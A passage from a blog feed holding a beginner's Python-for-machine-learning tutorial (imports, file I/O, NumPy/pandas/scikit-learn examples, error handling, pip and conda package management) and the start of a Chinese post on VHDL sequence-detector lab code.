class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Importing entire libraries/modules</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using functions from the math module</span></span><br><span class="line"><span class="built_in">print</span>(math.sqrt(<span class="number">25</span>))  <span class="comment"># Output: 5.0</span></span><br><span class="line"><span class="built_in">print</span>(math.pi)  <span class="comment"># Output: 3.141592653589793</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using functions from the random module</span></span><br><span class="line"><span class="built_in">print</span>(random.randint(<span class="number">1</span>, <span class="number">10</span>))  <span class="comment"># Output: random integer between 1 and 10 (inclusive)</span></span><br><span class="line"><span class="built_in">print</span>(random.choice([<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]))  <span class="comment"># Output: random choice from the given list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing specific functions from libraries/modules</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using functions/classes from the imported modules</span></span><br><span class="line">today = date.today()</span><br><span class="line"><span class="built_in">print</span>(today)  <span class="comment"># Output: current date</span></span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">shuffle(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_list)  <span class="comment"># Output: shuffled list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing modules with custom names</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using functions/classes from the imported modules with custom names</span></span><br><span class="line">array = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(array)  <span class="comment"># Output: array([1, 2, 3, 4, 5])</span></span><br><span class="line"></span><br><span class="line">data_frame = pd.DataFrame(&#123;<span class="string">&#x27;Name&#x27;</span>: [<span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Charlie&#x27;</span>], <span class="string">&#x27;Age&#x27;</span>: [<span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>]&#125;)</span><br><span class="line"><span class="built_in">print</span>(data_frame)  <span class="comment"># Output: DataFrame with Name and Age columns</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>Here’s an example code that demonstrates the usage of libraries related to Machine Learning and Deep Learning in Python:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the dataset</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Split the dataset into features and labels</span></span><br><span class="line">X = data.drop(<span class="string">&#x27;label&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line">y = data[<span class="string">&#x27;label&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Split the data into training and testing sets</span></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a logistic regression model</span></span><br><span class="line">model = LogisticRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Train the model</span></span><br><span class="line">model.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make predictions on the test set</span></span><br><span class="line">y_pred = model.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate accuracy</span></span><br><span class="line">accuracy = accuracy_score(y_test, y_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy:&#x27;</span>, accuracy)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-File-I-O"><a href="#4-File-I-O" class="headerlink" title="4. File I/O:"></a>4. <strong>File I/O</strong>:</h2></li></ul><ul><li>Understand how to read and write data from files using Python. Learn to work with different file formats like CSV, JSON, and text files. This knowledge will be helpful when loading and preprocessing datasets for ML and DL tasks.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File Writing Example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"><span class="comment"># If the file &quot;example.txt&quot; doesn&#x27;t exist, the write_to_file function will create it.</span></span><br><span class="line"><span class="comment"># The with open statement ensures that the file is properly closed after writing.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># File Reading Example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">filename = <span class="string">&quot;example.txt&quot;</span></span><br><span class="line">content_to_write = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing to a file</span></span><br><span class="line">write_to_file(filename, content_to_write)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Content &#x27;<span class="subst">&#123;content_to_write&#125;</span>&#x27; written to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reading from a file</span></span><br><span class="line">content_read = read_from_file(filename)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Content read from &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;content_read&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>If the file “example.txt” doesn’t exist, the write_to_file function will create it.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(filename):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; already exists.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Content &#x27;<span class="subst">&#123;content&#125;</span>&#x27; written to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>In this updated version, the os.path.isfile function is used to check if the file exists before attempting to write to it. If the file exists, a message is printed indicating that the file already exists. If the file doesn’t exist, it is created and the content is written to it, followed by a success message.</li><li>More detail demo:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File Writing Example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Content written to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; successfully.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error writing to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># File Reading Example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; not found.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error reading from &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Appending to a File</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">append_to_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Content appended to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; successfully.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error appending to &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">filename = <span class="string">&quot;example.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing to a file</span></span><br><span class="line">content_to_write = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">write_to_file(filename, content_to_write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reading from a file</span></span><br><span class="line">content_read = read_from_file(filename)</span><br><span class="line"><span class="keyword">if</span> content_read:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Content read from &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;content_read&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Appending to a file</span></span><br><span class="line">content_to_append = <span class="string">&quot;\nAppending some more content!&quot;</span></span><br><span class="line">append_to_file(filename, content_to_append)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reading from the file after appending</span></span><br><span class="line">content_read = read_from_file(filename)</span><br><span class="line"><span class="keyword">if</span> content_read:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Updated content read from &#x27;<span class="subst">&#123;filename&#125;</span>&#x27;: <span class="subst">&#123;content_read&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-Functions-and-Libraries-for-ML-DL"><a href="#5-Functions-and-Libraries-for-ML-DL" class="headerlink" title="5. Functions and Libraries for ML/DL:"></a>5. <strong>Functions and Libraries for ML/DL</strong>:</h2></li></ul><ul><li>Familiarize yourself with the functions and libraries specific to ML and DL. For example, learn about the scikit-learn library for ML algorithms, TensorFlow or PyTorch for DL, and Keras for high-level DL model building.</li></ul><ul><li><strong>NumPy</strong>: NumPy is a fundamental library for numerical computations in Python. It provides support for multi-dimensional arrays, mathematical functions, linear algebra, random number generation, and more. It is widely used as the foundation for many other ML and DL libraries.</li><li><strong>Pandas</strong>: Pandas is a library for data manipulation and analysis. It offers data structures like DataFrames and Series, which allow for efficient handling and processing of structured data. Pandas provides functions for data cleaning, transformation, merging, filtering, and other data manipulation tasks.</li><li><strong>scikit-learn</strong>: scikit-learn is a comprehensive library for machine learning. It provides a wide range of algorithms for classification, regression, clustering, dimensionality reduction, and model evaluation. scikit-learn also offers utilities for data preprocessing, feature extraction, and model selection.</li><li><strong>TensorFlow</strong>: TensorFlow is a popular DL framework developed by Google. It provides a flexible and efficient platform for building and training neural networks. TensorFlow offers a high-level API called Keras, as well as a lower-level API for advanced customization. It supports both CPU and GPU acceleration.</li><li><strong>PyTorch</strong>: PyTorch is another widely used DL framework known for its dynamic computational graph and easy-to-use interface. It allows for efficient model training, automatic differentiation, and GPU acceleration. PyTorch also provides a rich ecosystem of pre-trained models and utilities.</li><li><strong>Matplotlib</strong>: Matplotlib is a plotting library that enables the creation of various types of plots and visualizations. It offers a wide range of options for customizing plots, including line plots, scatter plots, bar plots, histograms, and more. Matplotlib is often used for visualizing data and model results.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate some sample data</span></span><br><span class="line">X = np.random.rand(<span class="number">100</span>, <span class="number">1</span>)</span><br><span class="line">y = <span class="number">2</span> * X + np.random.randn(<span class="number">100</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a Pandas DataFrame</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;X&#x27;</span>: X.flatten(), <span class="string">&#x27;y&#x27;</span>: y.flatten()&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fit a linear regression model</span></span><br><span class="line">model = LinearRegression()</span><br><span class="line">model.fit(X, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predict the output</span></span><br><span class="line">X_new = np.array([[<span class="number">0.2</span>], [<span class="number">0.4</span>], [<span class="number">0.6</span>]])</span><br><span class="line">y_pred = model.predict(X_new)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot the data and regression line</span></span><br><span class="line">plt.scatter(X, y, color=<span class="string">&#x27;blue&#x27;</span>, label=<span class="string">&#x27;Data&#x27;</span>)</span><br><span class="line">plt.plot(X_new, y_pred, color=<span class="string">&#x27;red&#x27;</span>, linewidth=<span class="number">2</span>, label=<span class="string">&#x27;Regression Line&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>In this example, we import NumPy, Pandas, scikit-learn’s LinearRegression, and Matplotlib. We generate some random data, create a Pandas DataFrame, fit a linear regression model, and make predictions. Finally, we plot the data points and the regression line using Matplotlib.<h2 id="6-Error-Handling-and-Debugging"><a href="#6-Error-Handling-and-Debugging" class="headerlink" title="6. Error Handling and Debugging:"></a>6. <strong>Error Handling and Debugging</strong>:</h2></li></ul><ul><li>Gain knowledge of how to handle exceptions and errors in Python. Learn techniques for debugging code and finding and fixing common issues.</li></ul><ul><li><strong>Understanding Error Types</strong>: Familiarize yourself with common error types such as syntax errors, runtime errors, and logical errors. Understanding these errors will help you diagnose and fix issues effectively.</li><li><strong>Using Exception Handling</strong>: Employ try-except blocks to catch and handle exceptions. This prevents your program from crashing and allows you to handle errors gracefully. By specifying different except blocks for specific exception types, you can handle different types of errors differently.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Code that might raise an exception</span></span><br><span class="line"><span class="keyword">except</span> SpecificExceptionType:</span><br><span class="line">    <span class="comment"># Code to handle the specific exception</span></span><br><span class="line"><span class="keyword">except</span> AnotherExceptionType:</span><br><span class="line">    <span class="comment"># Code to handle another specific exception</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># Code to handle any other exception</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>Logging: Utilize logging libraries, such as the built-in logging module in Python, to output useful information during runtime. Logging statements can help track the flow of your program and provide valuable insights when debugging.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage example</span></span><br><span class="line">logging.debug(<span class="string">&#x27;This is a debug message&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">&#x27;This is an info message&#x27;</span>)</span><br><span class="line">logging.warning(<span class="string">&#x27;This is a warning message&#x27;</span>)</span><br><span class="line">logging.error(<span class="string">&#x27;This is an error message&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><strong>Using Debuggers</strong>: Integrated Development Environments (IDEs) often come with built-in debuggers that allow you to step through your code, set breakpoints, and examine variable values. Utilizing the debugger can be immensely helpful in identifying and resolving errors.</li><li><strong>Reading Error Messages</strong>: Carefully read error messages, as they often provide useful information about the issue and its location in your code. Understand the stack trace to identify the specific line where the error occurred.</li><li><strong>Isolating Issues</strong>: If you encounter an error, try to isolate the problem by narrowing down the code section where the error occurs. By systematically commenting out or testing specific parts of your code, you can identify the root cause of the issue.<h2 id="7-Python-Package-Management"><a href="#7-Python-Package-Management" class="headerlink" title="7. Python Package Management:"></a>7. <strong>Python Package Management</strong>:</h2></li></ul><ul><li>Understand how to work with Python package managers like pip and conda. Learn how to install, update, and manage packages and dependencies required for ML and DL projects.</li></ul><ol><li><strong>pip</strong>: pip is the default package installer for Python. It allows you to install, upgrade, and uninstall packages from the Python Package Index (PyPI). You can use pip to install packages by running the command pip install package_name. For example, pip install numpy installs the NumPy package.</li><li><strong>Virtual Environments</strong>: Virtual environments provide isolated Python environments for your projects. They allow you to manage project-specific dependencies without interfering with other projects or the system-wide Python installation. Popular virtual environment tools for Python include venv, conda, and virtualenv. You can create a new virtual environment with the command python -m venv myenv and activate it using source myenv/bin/activate.</li><li><strong>requirements.txt</strong>: A requirements.txt file lists the dependencies required for your project. It allows you to specify the exact versions of the packages your project depends on. You can create a requirements.txt file by running pip freeze &gt; requirements.txt, which generates a list of installed packages and their versions. To install the dependencies from a requirements.txt file, use pip install -r requirements.txt.</li><li><strong>Package Managers</strong>: Package managers like conda provide additional functionality for managing packages, environments, and dependencies. Conda is particularly popular in the data science community as it offers both package and environment management. With conda, you can create environments, install packages from conda channels, and manage complex dependency graphs.</li><li><strong>Versioning</strong>: Pay attention to package versioning when managing dependencies. Specifying the package versions in your requirements.txt file helps ensure reproducibility and avoids compatibility issues. You can specify the version using operators like ==, &gt;=, &lt;, etc. For example, numpy==1.19.2 specifies an exact version, while tensorflow&gt;=2.0.0 specifies a minimum version.</li><li><strong>Package Indexes</strong>: Besides PyPI, other package indexes like Anaconda Cloud and GitHub Package Registry exist. These indexes may contain specialized packages and versions specific to certain domains or projects. You can specify custom indexes in your package manager’s configuration or use the —index-url flag when installing packages.</li></ol><ul><li>Managing packages and dependencies is crucial for ML and DL projects, as they often rely on various external libraries. Understanding package management tools and best practices ensures a smooth and consistent development process.</li><li>Note: The specific tools and commands mentioned above are commonly used, but the Python ecosystem is continuously evolving. It’s always a good idea to consult the official documentation for the latest recommendations and guidelines.<h2 id="Blessing"><a href="#Blessing" class="headerlink" title="Blessing:"></a>Blessing:</h2></li></ul><ul><li>While it’s not necessary to master every aspect of Python before starting ML and DL, having a strong foundation in these areas will make your journey smoother. As you progress with ML and DL, you’ll continue to deepen your Python skills by working on real-world projects and exploring advanced concepts specific to the field.</li><li>There are numerous online tutorials, courses, and books available to learn Python, including resources tailored specifically for ML and DL. It’s recommended to start with beginner-level Python resources and gradually build your knowledge as you gain confidence.</li><li>Remember, practice is key! Apply your Python skills to solve small coding challenges or work on mini-projects to reinforce your learning. As you become more comfortable, you can gradually transition to implementing ML and DL algorithms using Python and its associated libraries.</li><li>Feel free to ask people if you have any specific questions or need further guidance along the way. Good luck with your Python and ML/DL learning journey!</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数字逻辑】vhdl语言实验经验分享</title>
      <link href="/2023/06/06/Misc/vhdl%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2023/06/06/Misc/vhdl%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="时序逻辑实验"><a href="#时序逻辑实验" class="headerlink" title="时序逻辑实验"></a>时序逻辑实验</h2><h3 id="实验一：序列检测器"><a href="#实验一：序列检测器" class="headerlink" title="实验一：序列检测器"></a>实验一：序列检测器</h3><h4 id="实验代码："><a href="#实验代码：" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> IEEE;</span><br><span class="line"><span class="keyword">use</span> IEEE.STD_LOGIC_1164.<span class="keyword">ALL</span>;</span><br><span class="line"><span class="keyword">use</span> IEEE.STD_LOGIC_UNSIGNED.<span class="keyword">ALL</span>;</span><br><span class="line"><span class="keyword">use</span> IEEE.STD_LOGIC_ARITH.<span class="keyword">ALL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> seq_detector <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span>(x, clk: <span class="keyword">in</span> <span class="built_in">std_logic</span>;</span><br><span class="line">y: <span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> seq_detector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> utility <span class="keyword">of</span> seq_detector <span class="keyword">is</span></span><br><span class="line"><span class="keyword">type</span> state <span class="keyword">is</span> (s0, s1, s2, s3, s4, s5, s6, s7);</span><br><span class="line"><span class="keyword">signal</span> current_s, next_s: state;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(clk)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> clk<span class="symbol">&#x27;event</span> <span class="keyword">and</span> clk = <span class="string">&#x27;1&#x27;</span> <span class="keyword">then</span></span><br><span class="line">current_s &lt;= next_s;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span 